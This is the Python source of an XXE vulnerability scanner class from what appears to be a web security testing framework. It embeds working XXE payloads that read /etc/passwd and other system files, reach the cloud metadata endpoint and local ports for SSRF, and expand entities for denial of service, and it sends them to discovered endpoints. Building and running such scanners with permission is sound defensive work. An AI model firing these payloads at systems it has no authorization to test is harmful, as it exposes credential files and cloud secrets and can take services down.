"""
XML External Entity (XXE) Scanner - Detects XXE vulnerabilities
"""

import re
import logging
import requests
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Any, Optional
from core.config.config_manager import ConfigManager
from core.reporting.report_generator import Finding, Severity
from core.utils.logger import get_security_logger

logger = logging.getLogger(__name__)
security_logger = get_security_logger()

class XXEScanner:
    """XML External Entity vulnerability scanner."""
    
    def __init__(self, config_manager: ConfigManager):
        """
        Initialize the XXE scanner.
        
        Args:
            config_manager: Configuration manager instance
        """
        self.config = config_manager.get_scanner_config('xxe')
        self.general_config = config_manager.get('general')
        
        # XXE payloads for different purposes
        self.file_disclosure_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///proc/version">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>'''
        ]
        
        self.ssrf_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://localhost:22">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80">
]>
<root>&xxe;</root>'''
        ]
        
        self.dos_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///dev/random">
]>
<root>&xxe;</root>'''
        ]
        
        # Success indicators for file disclosure
        self.file_indicators = [
            'root:x:0:0:',  # /etc/passwd
            'localhost',    # /etc/hosts
            'kernel',       # /proc/version
            '# Copyright', # Windows hosts file
            'daemon:',
            '/bin/',
            '/usr/',
            '/sbin/',
        ]
        
        # Cloud metadata indicators
        self.cloud_indicators = [
            'ami-',
            'instance-identity',
            'security-credentials',
            'computeMetadata',
            'amazon-web-services'
        ]
        
        # Load payloads
        self.payloads = self._load_payloads()
    
    def scan(self, target_url: str) -> List[Finding]:
        """
        Scan target for XXE vulnerabilities.
        
        Args:
            target_url: Target URL to scan
            
        Returns:
            List of Finding objects
        """
        findings = []
        
        logger.info(f"Starting XXE scan on {target_url}")
        security_logger.log_scan_start("xxe", target_url)
        
        try:
            # Find XML endpoints
            xml_endpoints = self._find_xml_endpoints(target_url)
            
            for endpoint in xml_endpoints:
                # Test file disclosure XXE
                findings.extend(self._test_file_disclosure_xxe(endpoint))
                
                # Test SSRF via XXE
                findings.extend(self._test_ssrf_xxe(endpoint))
                
                # Test parameter XXE
                findings.extend(self._test_parameter_xxe(endpoint))
                
                # Test blind XXE
                findings.extend(self._test_blind_xxe(endpoint))
                
        except Exception as e:
            logger.error(f"XXE scan failed: {str(e)}")
            security_logger.log_error("XXE_SCAN_FAILED", str(e), target_url)
        
        logger.info(f"XXE scan completed. Found {len(findings)} potential issues.")
        return findings
    
    def _find_xml_endpoints(self, target_url: str) -> List[Dict[str, Any]]:
        """Find endpoints that likely accept XML input."""
        endpoints = []
        
        try:
            response = requests.get(target_url, timeout=self.general_config.get('timeout', 10))
            
            # Check if current endpoint accepts XML
            if self._likely_accepts_xml(response):
                endpoints.append({
                    'url': target_url,
                    'method': 'POST',
                    'type': 'direct'
                })
            
            # Look for forms that might accept XML
            form_patterns = [
                r'<form[^>]*action=[\'"]([^\'\"]*)[\'"][^>]*>',
            ]
            
            for pattern in form_patterns:
                matches = re.finditer(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    form_action = match.group(1)
                    if form_action.startswith('/'):
                        form_url = urljoin(target_url, form_action)
                    elif form_action.startswith('http'):
                        form_url = form_action
                    else:
                        form_url = urljoin(target_url, form_action)
                    
                    endpoints.append({
                        'url': form_url,
                        'method': 'POST',
                        'type': 'form'
                    })
            
            # Common API endpoints that might accept XML
            common_xml_paths = [
                '/api/xml',
                '/xml',
                '/soap',
                '/services',
                '/webservice',
                '/api/upload',
                '/upload'
            ]
            
            for path in common_xml_paths:
                xml_url = urljoin(target_url, path)
                endpoints.append({
                    'url': xml_url,
                    'method': 'POST',
                    'type': 'api'
                })
                
        except Exception as e:
            logger.debug(f"Error finding XML endpoints: {str(e)}")
        
        return endpoints
    
    def _likely_accepts_xml(self, response: requests.Response) -> bool:
        """Check if endpoint likely accepts XML."""
        content_type = response.headers.get('content-type', '').lower()
        
        # Check content type
        xml_content_types = [
            'application/xml',
            'text/xml',
            'application/soap+xml'
        ]
        
        if any(ct in content_type for ct in xml_content_types):
            return True
        
        # Check response body for XML indicators
        response_text = response.text.lower()
        xml_indicators = [
            '<xml',
            '<?xml',
            'soap:',
            'xmlns:',
            'application/xml',
            'text/xml'
        ]
        
        return any(indicator in response_text for indicator in xml_indicators)
    
    def _test_file_disclosure_xxe(self, endpoint: Dict[str, Any]) -> List[Finding]:
        """Test file disclosure XXE attacks."""
        findings = []
        
        for payload in self.file_disclosure_payloads[:2]:  # Test first 2 payloads
            try:
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml, text/xml, */*'
                }
                
                response = requests.request(
                    endpoint['method'],
                    endpoint['url'],
                    data=payload,
                    headers=headers,
                    timeout=self.general_config.get('timeout', 10)
                )
                
                # Check for file disclosure
                if self._is_file_disclosure_successful(response):
                    finding = Finding(
                        title="XML External Entity (XXE) - File Disclosure",
                        severity=Severity.HIGH,
                        confidence=0.9,
                        description="XXE vulnerability allows local file disclosure",
                        target=endpoint['url'],
                        vulnerability_type="XML External Entity",
                        evidence=f"File disclosure detected in response",
                        impact="Attacker can read local files from the server.",
                        remediation="Disable external entity processing in XML parsers."
                    )
                    findings.append(finding)
                    return findings  # Stop after first successful finding
                    
            except Exception as e:
                logger.debug(f"Error testing file disclosure XXE: {str(e)}")
        
        return findings
    
    def _test_ssrf_xxe(self, endpoint: Dict[str, Any]) -> List[Finding]:
        """Test SSRF via XXE attacks."""
        findings = []
        
        for payload in self.ssrf_payloads[:2]:  # Test first 2 payloads
            try:
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml, text/xml, */*'
                }
                
                response = requests.request(
                    endpoint['method'],
                    endpoint['url'],
                    data=payload,
                    headers=headers,
                    timeout=self.general_config.get('timeout', 10)
                )
                
                # Check for SSRF success
                if self._is_ssrf_xxe_successful(response):
                    finding = Finding(
                        title="XML External Entity (XXE) - SSRF",
                        severity=Severity.HIGH,
                        confidence=0.8,
                        description="XXE vulnerability allows Server-Side Request Forgery",
                        target=endpoint['url'],
                        vulnerability_type="XML External Entity",
                        evidence=f"SSRF via XXE detected in response",
                        impact="Attacker can make requests to internal services and cloud metadata.",
                        remediation="Disable external entity processing and implement network restrictions."
                    )
                    findings.append(finding)
                    return findings
                    
            except Exception as e:
                logger.debug(f"Error testing SSRF XXE: {str(e)}")
        
        return findings
    
    def _test_parameter_xxe(self, endpoint: Dict[str, Any]) -> List[Finding]:
        """Test XXE in parameters that might be processed as XML."""
        findings = []
        
        # Simple XXE payload for parameter testing
        simple_payload = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'''
        
        try:
            # Test with form data
            form_data = {
                'xml': simple_payload,
                'data': simple_payload,
                'content': simple_payload,
                'input': simple_payload
            }
            
            response = requests.post(
                endpoint['url'],
                data=form_data,
                timeout=self.general_config.get('timeout', 10)
            )
            
            if self._is_file_disclosure_successful(response):
                finding = Finding(
                    title="XML External Entity (XXE) - Parameter Injection",
                    severity=Severity.HIGH,
                    confidence=0.7,
                    description="XXE vulnerability in parameter processing",
                    target=endpoint['url'],
                    vulnerability_type="XML External Entity",
                    evidence="File disclosure via parameter XXE injection",
                    impact="Attacker can inject XXE payloads through form parameters.",
                    remediation="Validate and sanitize all input parameters."
                )
                findings.append(finding)
                
        except Exception as e:
            logger.debug(f"Error testing parameter XXE: {str(e)}")
        
        return findings
    
    def _test_blind_xxe(self, endpoint: Dict[str, Any]) -> List[Finding]:
        """Test blind XXE attacks."""
        findings = []
        
        # Blind XXE payload that attempts to trigger error or timing difference
        blind_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:1234/nonexistent">
]>
<root>&xxe;</root>'''
        
        try:
            headers = {
                'Content-Type': 'application/xml',
                'Accept': 'application/xml, text/xml, */*'
            }
            
            # Test normal request first
            normal_response = requests.request(
                endpoint['method'],
                endpoint['url'],
                data='<root>test</root>',
                headers=headers,
                timeout=self.general_config.get('timeout', 10)
            )
            
            # Test with blind XXE payload
            xxe_response = requests.request(
                endpoint['method'],
                endpoint['url'],
                data=blind_payload,
                headers=headers,
                timeout=self.general_config.get('timeout', 10)
            )
            
            # Compare responses
            if self._is_blind_xxe_successful(normal_response, xxe_response):
                finding = Finding(
                    title="Potential Blind XML External Entity (XXE)",
                    severity=Severity.MEDIUM,
                    confidence=0.5,
                    description="Blind XXE vulnerability may be present",
                    target=endpoint['url'],
                    vulnerability_type="XML External Entity",
                    evidence="Response differences indicate potential blind XXE",
                    impact="Application may be vulnerable to blind XXE attacks.",
                    remediation="Disable external entity processing in XML parsers."
                )
                findings.append(finding)
                
        except Exception as e:
            logger.debug(f"Error testing blind XXE: {str(e)}")
        
        return findings
    
    def _is_file_disclosure_successful(self, response: requests.Response) -> bool:
        """Check if file disclosure XXE was successful."""
        try:
            response_text = response.text.lower()
            
            # Check for file content indicators
            for indicator in self.file_indicators:
                if indicator.lower() in response_text:
                    return True
            
            # Check for XML parsing errors that might reveal file content
            error_patterns = [
                r'system identifier.*file:///',
                r'external entity.*file:///',
                r'cannot resolve.*file:///',
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def _is_ssrf_xxe_successful(self, response: requests.Response) -> bool:
        """Check if SSRF XXE was successful."""
        try:
            response_text = response.text.lower()
            
            # Check for cloud metadata
            for indicator in self.cloud_indicators:
                if indicator.lower() in response_text:
                    return True
            
            # Check for connection errors that indicate SSRF attempt
            ssrf_indicators = [
                'connection refused',
                'connection timeout',
                'network unreachable',
                'no route to host',
                'connection reset'
            ]
            
            for indicator in ssrf_indicators:
                if indicator in response_text:
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def _is_blind_xxe_successful(self, normal_response: requests.Response, xxe_response: requests.Response) -> bool:
        """Check if blind XXE attack was successful by comparing responses."""
        try:
            # Compare response codes
            if normal_response.status_code != xxe_response.status_code:
                return True
            
            # Compare response lengths
            normal_length = len(normal_response.text)
            xxe_length = len(xxe_response.text)
            
            if abs(normal_length - xxe_length) > 100:  # Significant difference
                return True
            
            # Check for error messages in XXE response
            xxe_text = xxe_response.text.lower()
            error_indicators = [
                'external entity',
                'xml parse',
                'dtd',
                'entity',
                'parse error',
                'xml error'
            ]
            
            if any(indicator in xxe_text for indicator in error_indicators):
                normal_text = normal_response.text.lower()
                if not any(indicator in normal_text for indicator in error_indicators):
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load XXE payloads."""
        return {
            'file_disclosure': self.file_disclosure_payloads,
            'ssrf': self.ssrf_payloads,
            'dos': self.dos_payloads
        }